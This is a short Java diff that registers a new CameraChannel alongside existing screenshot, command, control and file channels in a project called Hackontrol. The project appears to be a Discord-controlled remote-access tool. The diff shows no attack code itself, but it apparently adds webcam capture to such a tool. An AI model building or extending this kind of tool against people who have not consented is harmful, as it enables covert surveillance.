@@ -1,6 +1,7 @@
 package com.khopan.hackontrol.registration;
 
 import com.khopan.hackontrol.Hackontrol;
+import com.khopan.hackontrol.channel.CameraChannel;
 import com.khopan.hackontrol.channel.HackontrolDiscordChannel;
 import com.khopan.hackontrol.channel.ScreenshotChannel;
 import com.khopan.hackontrol.channel.command.CommandChannel;
@@ -14,6 +15,7 @@ public class ChannelRegistry {
 
 	public static void register(Registry registry) {
 		registry.register(Hackontrol.CHANNEL_REGISTRY, HackontrolDiscordChannel.class);
+		registry.register(Hackontrol.CHANNEL_REGISTRY, CameraChannel.class);
 		registry.register(Hackontrol.CHANNEL_REGISTRY, CommandChannel.class);
 		registry.register(Hackontrol.CHANNEL_REGISTRY, ControlChannel.class);
 		registry.register(Hackontrol.CHANNEL_REGISTRY, FileChannel.class);
